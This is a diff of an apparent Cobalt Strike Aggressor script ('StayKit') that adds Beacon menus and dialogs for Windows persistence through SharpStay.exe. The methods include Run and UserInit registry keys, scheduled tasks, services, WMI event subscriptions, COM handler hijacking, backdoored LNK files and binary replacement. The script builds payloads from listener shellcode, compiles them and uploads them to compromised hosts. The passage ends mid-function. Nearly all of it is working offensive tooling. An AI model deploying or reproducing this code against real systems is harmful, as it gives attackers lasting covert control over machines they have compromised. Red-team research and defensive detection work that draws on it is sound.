@@ -1,0 +1,1496 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+
+#################################################
+
+#   Elevated
+
+#################################################
+menu Elevated{
+			#item "Elevated: WMI Registry Key  - T1047"{
+				#local('$bid');
+				#foreach $bid ($1){
+					#wmielevatedregdialog($bid);
+				#}
+			#}
+			item "Elevated: Registry Key"{
+				local('$bid');
+				foreach $bid ($1){
+					&elevatedregistrydialog($bid);
+				}
+			}
+			item "Elevated: UserInit Registry Key"{
+				local('$bid');
+				foreach $bid ($1){
+					&elevateduserinitregistrydialog($bid);
+				}
+			}
+			item "Elevated: Scheduled Task  - T1053"{
+				local('$bid');
+				foreach $bid ($1){
+					&scheduledtaskdialog($bid);
+				}
+			}
+			item "Elevated: Create Service  - T1035"{
+				local('$bid');
+				foreach $bid ($1){
+					&servicedialog($bid);
+				}			}
+			item "Elevated: WMI Event Subscription  - T1047"{
+				local('$bid');
+				foreach $bid ($1){
+					&wmieventsubdialog($bid);
+				}
+			}
+		}
+
+
+#################################################
+
+#   Non-Elevated
+
+#################################################
+menu Non-Elevated {
+			item "Non-Elevated: Registry Key"{
+				local('$bid');
+				foreach $bid ($1){
+					&userregistrydialog($bid);
+				}
+			}
+			item "Non-Elevated: Registry UserInitMprLogonScript Key"{
+				local('$bid');
+				foreach $bid ($1){
+					&registryuserinitmprlogondialog($bid);
+				}
+			}
+			item "Non-Elevated: Scheduled Task  - T1053"{
+				local('$bid');
+				foreach $bid ($1){
+					&scheduledtaskdialog($bid);
+				}
+			}
+			item "Non-Elevated: Scheduled Task COM Handler Hijack  - T1053"{
+				local('$bid');
+				foreach $bid ($1){
+					&schtskcomhijackdialog($bid);
+				}
+			}
+			item "Non-Elevated: Junction Folder"{
+				local('$bid');
+				foreach $bid ($1){
+					&junctionfolderdialog($bid);
+				}
+			}
+		}
+
+
+#################################################
+
+#   Misc
+
+#################################################
+menu Misc{
+			item "Misc: Add Action to Scheduled Task  - T1053"{
+				local('$bid');
+				foreach $bid ($1){
+					&addactionschtaskdialog($bid);
+				}
+			}
+			item "Misc: Replace Binary/File"{
+				local('$bid');
+				foreach $bid ($1){
+					&replacefiledialog($bid);
+				}
+			}
+			item "Misc: Startup Folder"{
+				local('$bid');
+				foreach $bid ($1){
+					&startupfolderdialog($bid);
+				}
+			}
+			item "Misc: New LNK"{
+				local('$bid');
+				foreach $bid ($1){
+					&newlnkdialog($bid);
+				}
+			}
+			item "Misc: Backdoor LNK"{
+				local('$bid');
+				foreach $bid ($1){
+					&backdoorlnkdialog($bid);
+				}
+			}
+			item "Misc: Get Running Services  - T1007"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($bid, "StayKit get running services");
+					blog2($bid, "" . dstamp(ticks()) . " - Showing running services via SharpStay");
+					bexecute_assembly!($bid, $sharppersist, "action=listrunningservices");
+				}
+			}
+			item "Misc: Get Scheduled Tasks  - T1053"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($bid, "StayKit get scheduled tasks");
+					blog2($bid, "" . dstamp(ticks()) . " - Showing scheduled tasks via SharpStay");
+					bexecute_assembly!($bid, $sharppersist, "action=listtasknames");
+				}
+			}
+			item "Misc: Get Scheduled Task ComHandler  - T1053"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($bid, "StayKit get scheduled tasks com handlers");
+					blog2($bid, "" . dstamp(ticks()) . " - Showing Scheduled tasks with COM handlers via SharpStay");
+					bexecute_assembly!($bid, $sharppersist, "action=GetScheduledTaskComHandler");
+				}
+			}
+		}
+
+#################################################
+
+#   Setup/Update Default
+
+#################################################
+item "Set/Update Defaults"{
+			&updateglobals();
+		}
+
+
+#################################################
+
+#   SharpTask
+
+#################################################
+item "SharpTask  - T1053"{
+		local('$bid');
+				foreach $bid ($1){
+					sharptask($bid);
+				}
+			}
+
+
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+
+#Sharpersist
+
+$sharppersist = script_resource("/opt/cobalt_strike_extension_kit/exe/SharpStay.exe");
+# For quick persistence - Global vars
+%persistdefaults["regkeyname"] = "WinReg";
+%persistdefaults["taskname"] = "WinTask";
+%persistdefaults["servicename"] = "WinSvc";
+%persistdefaults["eventname"] = "WinEvent";
+%persistdefaults["attime"] = "startup";
+%persistdefaults["lnkpath"] = "";
+%persistdefaults["command"] = "";
+%persistdefaults["droplocation"] = "C:\\Windows\\Temp\\Stay.exe";
+%persistdefaults["clsid"] = "";
+%persistdefaults["dllpath"] = "";
+
+#Payload defaults
+%persistdefaults["customfile"] = "";
+%persistdefaults["listener"] = "";
+%persistdefaults["template"] = "";
+%persistdefaults["staged"] = "false";
+%persistdefaults["x86"] = "false";
+%persistdefaults["findreplace"] = "\$\$PAYLOAD\$\$";
+%persistdefaults["shellcodeformat"] = "base64";
+#%persistdefaults[""] = "";
+
+sub updateglobals{
+	local('$dialog');
+	$dialog = dialog("Global variables", %persistdefaults, &saveoptions);
+	dialog_description($dialog, "Global variables");
+	drow_text($dialog, "regkeyname", "Registry Key Name: ");
+	drow_text($dialog, "taskname", "Task Name: ");
+	drow_text($dialog, "servicename", "Service Name");
+	drow_text($dialog, "eventname", "Event Name");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "clsid", "ClassID: ");
+	drow_text($dialog, "dllpath", "DLL Path: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "template", "Payload Template: ");
+	drow_combobox($dialog, "shellcodeformat", "Shellcode Format: ", @("raw", "base64", "array", "hex", "powershell-base64", "vba", "vbs", "veil"));
+	drow_text($dialog, "findreplace", "Find Replace String: ");
+	drow_checkbox($dialog, "staged", "Staged Payloads: ");
+	drow_checkbox($dialog, "x86", "x86 Payloads: ");
+	dbutton_action($dialog, "Update");
+	dialog_show($dialog);
+	#drow_text($dialog, "", "");
+}
+
+sub saveoptions{
+	local('%options');
+	%options = $3;
+	%persistdefaults["regkeyname"] = %options["regkeyname"];
+	%persistdefaults["taskname"] = %options["taskname"];
+	%persistdefaults["servicename"] = %options["servicename"];
+	%persistdefaults["eventname "] = %options["eventname"];
+	%persistdefaults["command"] = %options["command"];
+	%persistdefaults["droplocation"] = %options["droplocation"];
+	%persistdefaults["customfile"] = %options["customfile"];
+	%persistdefaults["clsid"] = %options["clsid"];
+	%persistdefaults["dllpath"] = %options["dllpath"];
+
+	%persistdefaults["listener"] = %options["listener"];
+	%persistdefaults["template"] = %options["template"];
+	%persistdefaults["staged"] = %options["staged"];
+	%persistdefaults["x86"] = %options["x86"];
+	%persistdefaults["findreplace"] = %options["findreplace"];
+	%persistdefaults["shellcodeformat"] = %options["shellcodeformat"];
+	
+	show_message("Defaults have been saved");
+}
+
+sub executepersistence{
+	local('$bid $taskargs $inst');
+	$bid = $1;
+	$taskargs = $3;
+	$inst = $4;
+	$persisttype = $5;
+	binput($bid, "StayKit $inst $persisttype Persistence");
+	btask($bid, "" . dstamp(ticks()) . " - $inst $persisttype Persistence via StayKit/SharpStay");
+	bexecute_assembly!($bid, $sharppersist, $taskargs);
+}
+
+sub compilepl{
+	local('$cmpdata $prebuild $cmpledfl $handle4 $buildcpled $handle $sourcepay $refs $archi $platf $saveas $cmplrtest $testres');
+	$sourcepay = $1;
+	$archi = $2;
+	$compiler = "mcs";
+	$cmplrtest = exec("which $compiler");
+	$testres = readAll($cmplrtest);
+	$saveas = script_resource("CompiledFile.exe");
+	if($testres eq "@()"){
+		show_message("It appears you do not have the right compiler \($compiler\) installed, Mono is required to build this payload");
+		exit();
+	}
+
+	if($archi eq "x86"){
+		$platf = "-platform:x86";
+	}
+	else if($archi eq "x64"){
+		$platf = "-platform:x64";
+	}
+	$prebuild = script_resource("TempPreCompileFile.cs");
+	$handle4 = openf(">$prebuild");
+	writeb($handle4, $sourcepay);
+	closef($handle4);
+
+	$buildcpled = exec("mcs $platf $refs -out:$saveas $prebuild");
+	@datax = readAll($buildcpled);
+	closef($buildcpled);
+	sleep(2000);
+
+	$cmpledfl = openf($saveas);
+	$cmpdata = readb($cmpledfl, -1);
+	closef($cmpledfl);
+
+	deleteFile($saveas);
+	deleteFile($prebuild);
+	return $cmpdata;
+}
+
+sub payloadhandler{
+	local('$bid $gen $arguments $droplo $plarch');
+	$bid = $1;
+	$gen = $2;
+	$arguments = $3;
+	$droplo = $4;
+	if(%persistdefaults["x86"] eq "false"){
+		$plarch = "x64";
+	}
+	else{
+		$plarch = "x86";
+	}
+	if ($gen["customfile"] ne ""){
+		$handle = openf($gen["customfile"]);
+		$data = readb($handle, -1);
+		closef($handle);
+		blog2($bid, "" . dstamp(ticks()) . " - StayKit is writing $gen['customfile'] to $droplo")
+		bupload_raw!($bid, $droplo, $data);
+	}
+	else{
+		#Build your payload
+		if($gen['staged'] eq "false"){
+			$shcode = artifact_payload($gen['listener'], "raw", $plarch);
+			if(%persistdefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%persistdefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %persistdefaults["shellcodeformat"])
+			}
+		}
+		else{
+			$shcode = stager($gen['listener'], $plarch);
+			if(%persistdefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%persistdefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %persistdefaults["shellcodeformat"])
+			}
+		}
+		$outpl = openf($gen["template"]);
+		$data = readb($outpl, -1);
+		closef($outpl);
+		$noncompiled = strrep($data, %persistdefaults["findreplace"], $finshellc);
+		if($gen['droplocation'] ismatch '.*\.exe$'){
+			$finalpayload = &compilepl($noncompiled, $plarch);
+		}
+		else{
+			$finalpayload = $noncompiled;
+		}
+		blog2($bid, "" . dstamp(ticks()) . " - StayKit is writing built template to $droplo")
+		bupload_raw($bid, $droplo, $finalpayload);
+	}	
+}
+
+sub persistencehandler{
+	local('$bid $parg $ops $dloc $inst $persisttype');
+	$bid = $1;
+	$ops = $2;
+	$parg = $3;
+	$persisttype = $4;
+	$inst = "Installing";
+
+	if(($ops["template"] ne "") && ($ops["customfile"] ne "")){
+		show_error("Cannot select a template and custom file, must pick one");
+		exit();
+	}
+	if(($ops["template"] ne "") && ($ops["listener"] eq "")){
+		show_error("Listener is required with template");
+		exit();
+	}
+
+	if($ops['cleanup'] eq "true"){
+		$inst = "Removing";
+	}
+	if($ops['cleanup'] eq "true"){
+		&executepersistence($bid, $ops, $parg, $inst, $persisttype);
+	}
+	else if (($ops["template"] eq "") && ($ops["customfile"] eq "")){
+		&executepersistence($bid, $ops, $parg, $inst, $persisttype);
+	}
+	else{
+		$dloc = $ops["droplocation"];
+		&payloadhandler($bid, $ops, $parg, $dloc);
+		&executepersistence($bid, $ops, $parg, $inst, $persisttype);
+	}
+}
+
+sub argbuilder{
+	local('$bid $parg $pertype $path $x');
+	$bid = $1;
+	$parg = "";
+	$pertype = $3;
+
+	$parg .= 'action=';
+	$parg .= $pertype;
+	$parg .= ' ';
+	
+	#Ugly but gets the job done
+	if(($2["regkeyname"]) && ($2["regkeyname"] ne "")){
+		$parg .= 'keyname="';
+		$parg .= $2["regkeyname"];
+		$parg .= '" ';
+	}
+	if(($2["taskname"]) && ($2["taskname"] ne "")){
+		$parg .= 'taskname="';
+		$parg .= $2["taskname"];
+		$parg .= '" ';
+	}
+	if(($2["servicename"]) && ($2["servicename"] ne "")){
+		$parg .= 'servicename="';
+		$parg .= $2["servicename"];
+		$parg .= '" ';
+	}
+	if(($2["eventname"]) && ($2["eventname"] ne "")){
+		$parg .= 'eventname="';
+		$parg .= $2["eventname"];
+		$parg .= '" ';
+	}
+	if (($2["attime"]) && ($2["attime"] ne "")){
+		$parg .= 'attime="';
+		$parg .= $2["attime"];
+		$parg .= '" ';
+	}
+	if (($2["clsid"]) && ($2["clsid"] ne "")){
+		$parg .= 'clsid="';
+		$parg .= $2["clsid"];
+		$parg .= '" ';
+	}
+	if (($2["dllpath"]) && ($2["dllpath"] ne "")){
+		$parg .= 'dllpath="';
+		$parg .= $2["dllpath"];
+		$parg .= '" ';
+	}
+	if (($2["lnkpath"]) && ($2["lnkpath"] ne "")){
+		$parg .= 'lnkpath="';
+		$parg .= $2["lnkpath"];
+		$parg .= '" ';
+	}
+	if (($2["command"]) && ($2["command"] ne "")){
+		$parg .= 'command="';
+		$parg .= $2["command"];
+		$parg .= '" ';
+	}
+	if (($2["regkey"]) && ($2["regkey"] ne "")){
+		($x, $path) = split(':', $2['regkey']);
+		$parg .= 'keypath="';
+		$parg .= $path;
+		$parg .= '" ';
+	}
+	if(($2["runasuser"]) && ($2["runasuser"] ne "")){
+		$parg .= 'runasuser="';
+		$parg .= $2["runasuser"];
+		$parg .= '" ';
+	}
+	if(($2["logonuser"]) && ($2["logonuser"] ne "")){
+		$parg .= 'logonuser="';
+		$parg .= $2["logonuser"];
+		$parg .= '" ';
+	}
+	if(($2["triggertype"]) && ($2["triggertype"] ne "")){
+		$parg .= 'triggertype="';
+		$parg .= $2["triggertype"];
+		$parg .= '" ';
+	}
+	if(($2["author"]) && ($2["author"] ne "")){
+		$parg .= 'author="';
+		$parg .= $2["author"];
+		$parg .= '" ';
+	}
+	if(($2["description"]) && ($2["description"] ne "")){
+		$parg .= 'description="';
+		$parg .= $2["description"];
+		$parg .= '" ';
+	}
+	if(($2["rep"]) && ($2["rep"] ne "")){
+		$parg .= 'rep="';
+		$parg .= $2["rep"];
+		$parg .= '" ';
+	}
+	if(($2["guid"]) && ($2["guid"] ne "")){
+		$parg .= 'guid="';
+		$parg .= $2["guid"];
+		$parg .= '" ';
+	}
+	if(($2["filepath"]) && ($2["filepath"] ne "")){
+		$parg .= 'filepath="';
+		$parg .= $2["filepath"];
+		$parg .= '" ';
+	}
+
+	if(($2["folder"]) && ($2["folder"] ne "")){
+		$parg .= 'folder="';
+		$parg .= $2["folder"];
+		$parg .= '" ';
+	}
+	if(($2["actionid"]) && ($2["actionid"] ne "")){
+		$parg .= 'actionid="';
+		$parg .= $2["actionid"];
+		$parg .= '" ';
+	}
+	if(($2["lnkname"]) && ($2["lnkname"] ne "")){
+		$parg .= 'lnkname="';
+		$parg .= $2["lnkname"];
+		$parg .= '" ';
+	}
+	if(($2["lnktarget"]) && ($2["lnktarget"] ne "")){
+		$parg .= 'lnktarget="';
+		$parg .= $2["lnktarget"];
+		$parg .= '" ';
+	}
+	if(($2["lnkicon"]) && ($2["lnkicon"] ne "")){
+		$parg .= 'lnkicon="';
+		$parg .= $2["lnkicon"];
+		$parg .= '" ';
+	}
+	if (($2["cleanup"]) && ($2["cleanup"] ne "false")){
+		$parg .= 'cleanup=true ';
+	}
+	&persistencehandler($bid, $2, $parg, $pertype);
+}
+
+sub precheck{
+	# pre checks
+		# Add to prechecks 
+	#if(){
+
+	#}
+	#else{
+		#show_error("[-] You are missing required arguments for your persistence method");
+		#exit();
+	#}
+}
+
+sub replacefile{
+	local('$bid $newname $app $handle $data');
+	$bid = $1;
+	if($2['cleanup'] eq "true"){
+		if(($2['droplocation'] eq "") || ($2['customfile'] eq "")){
+			berror($bid, "Drop location is the file being cleaned up and customfile is the original file");
+			exit();
+		}
+		else{
+			if($2["action"] eq "Download and remove"){
+				$handle = openf($2["customfile"]);
+				$data = readb($handle, -1);
+				closef($handle);
+				blog2($bid, "" . dstamp(ticks()) . " - StayKit is writing $2['customfile'] to $2['droplocation'] for cleanup")
+				bupload_raw!($bid, $2['droplocation'], $data);
+			}
+			else if(($2["action"] eq "Append .bak to name") || ($2["action"] eq "Append random characters to name")){
+				blog2($bid, "Deleting $2['droplocation'] and setting $2['customfile'] back original name");
+				brm!($bid, $2["droplocation"]);
+				bmv!($bid, $2["customfile"], $2["droplocation"]);
+			}
+		}
+	}
+	else{
+		binput($bid, "StayKit replacefile Persistence");
+		if($2["action"] eq "Download and remove"){
+			bdownload($bid, $2["droplocation"]);
+			bpause($bid, 5000);
+			#Should be able to overwrite rather than delete
+			#brm($bid, $2["droplocation"]);
+			blog2($bid, "Overwrote original file at $2['droplocation']");
+		}
+		else if($2["action"] eq "Append .bak to name"){
+			$newname = "" . $2["droplocation"] . "\.bak";
+			bmv!($bid, $2["droplocation"], $newname);
+			bpause($bid, 5000);
+			blog2($bid, "Appended \.bak to $2['droplocation']");
+		}
+		else if($2["action"] eq "Append random characters to name"){
+			$app = &randchars();
+			$newname = "" . $2["droplocation"] . "\.$app";
+			bmv!($bid, $2["droplocation"], $newname);
+			bpause($bid, 5000);
+			blog2($bid, "Appended \.$app to $2['droplocation']");
+		}
+		&payloadhandler($bid, $2, $null, $2["droplocation"]);
+	}
+}
+
+sub randchars{
+	local('$i $ra @chararray')
+	@chararray = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
+	$ra = ""; 
+	for ($i = 0; $i < 7; $i++){ 
+		$ra .= rand(@chararray)
+	} 
+	return $ra;
+}
+
+sub startupdir{
+	local('$bid $ops $fname $dpath $dloc $user $name $x');
+	$bid = $1;
+	$ops = $2;
+	if (($ops["template"] eq "") && ($ops["customfile"] eq "") && ($ops["cleanup"] eq "false")){
+		show_error("Must select payload to drop");
+		exit();
+	}
+	else if(($ops["template"] ne "") && ($ops["customfile"] ne "") &&($ops["cleanup"] eq "false")){
+		show_error("Select either a template or a custom file");
+		exit();
+	}
+	else{
+		if($ops["startuppath"] eq "%APPDATA%"){
+			$user = binfo($bid, 'user');
+			if($user ismatch '\w+ \*'){
+				($name, $x) = split(' \*', $user)
+			}
+			else{
+				$name = $user;
+			}
+			$dpath = "C:\\Users\\$name\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+		}
+		else if($ops["startuppath"] eq "%PROGRAMDATA%"){
+			$dpath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
+		}
+		if($ops["filename"] eq ""){
+			show_error("Must enter on target filename");
+			exit();
+		}
+		else{
+			$fname = $ops["filename"];
+		}
+		$dloc = "$dpath\\$fname";
+		if($ops["cleanup"] eq "true"){
+			brm($bid, $dloc);
+		}
+		else{
+			&payloadhandler($bid, $ops, $null, $dloc);
+		}
+		
+
+	}
+}
+
+
+###################################
+#######################################
+#####################################
+############################
+
+#################################################
+
+#   Elevated
+
+#################################################
+sub elevatedregistrydialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "elevatedregistrykey";
+
+	%defaults["regkeyname"]  = %persistdefaults["regkeyname"];
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["template"] = %persistdefaults["template"];
+	
+	$dialog = dialog("Elevated: Registry Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&eleregistryhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Elevated: Create new registry key");
+	drow_text($dialog, "regkeyname", "Key Name: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_combobox($dialog, "regkey", "Registry Key", @("HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub elevateduserinitregistrydialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "elevateduserinitkey";
+
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Elevated: Registry UserInit Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&eleuserinitregistryhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Elevated: Create new registry UserInit key");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub scheduledtaskdialog{
+	local('$dialog %defaults $bid $runasuser');
+	$bid = $1;
+	$ptype = "scheduledtask";
+
+	%defaults["taskname"]  = %persistdefaults["taskname"];
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Elevated: Scheduled Task", %defaults, lambda({
+		if($2 eq "Help"){
+			&elescheduledtaskhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Elevated: Create a new scheduled task");
+	drow_text($dialog, "taskname", "Task Name: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "runasuser", "Run As: ");
+	drow_text($dialog, "logonuser", "Logon As: ");
+	drow_combobox($dialog, "triggertype", "Trigger Type", @("hourly", "daily", "weekly", "monthly", "idle", "logon", "boot"));
+	# Add folder option
+	drow_text($dialog, "author", "Author: ");
+	drow_text($dialog, "description", "Description: ");
+	drow_text($dialog, "rep", "Repetition: ");
+	drow_text($dialog, "attime", "At Time: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template File: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub servicedialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "createservice";
+
+	%defaults["servicename"]  = %persistdefaults["servicename"];
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Elevated: Service Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&eleservicehelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Elevated: Create new service");
+	drow_text($dialog, "servicename", "Service Name: ");
+	drow_text($dialog, "command", "Command: ");
+	#Add Service Description
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub wmieventsubdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "wmieventsub";
+
+	%defaults["eventname"]  = %persistdefaults["eventname"];
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["attime"] = %persistdefaults["attime"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Elevated: WMI Event Subscription Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&elewmieventsubhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Elevated: Create WMI Event Subscription");
+	drow_text($dialog, "eventname", "Event Name: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "attime", "At Time: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+
+#################################################
+
+#   Non-Elevated
+
+#################################################
+sub userregistrydialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "userregistrykey";
+
+	%defaults["regkeyname"]  = %persistdefaults["regkeyname"];
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Non-Elevated: Registry Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&nonregistryhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Non-Elevated: Create a new registry key");
+	drow_text($dialog, "regkeyname", "Key Name: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_combobox($dialog, "regkey", "Registry Key", @("HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub registryuserinitmprlogondialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "userinitmprlogonscriptkey";
+
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Non-Elevated: Registry UserInitMprLogonScript Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&nonregistryuserinitmprlogonhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Non-Elevated: Create a new registry UserInitMprLogonScript key");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub schtskcomhijackdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "schtaskcomhijack";
+
+	%defaults["clsid"] = %persistdefaults["clsid"];
+	%defaults["dllpath"] = %persistdefaults["dllpath"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+
+	$dialog = dialog("Non-Elevated: Scheduled Task COM Handler Hijack", %defaults, lambda({
+		if($2 eq "Help"){
+			&nonschtskcomhijackhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+	}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Non-Elevated: Scheduled Task COM Hijack Persistence");
+	drow_text($dialog, "clsid", "ClassID: ");
+	drow_text($dialog, "dllpath", "DLL Path: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub junctionfolderdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "junctionfolder";
+
+	%defaults["dllpath"]  = %persistdefaults["dllpath"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Non-Elevated: Junction Folder Persistence", %defaults, lambda({
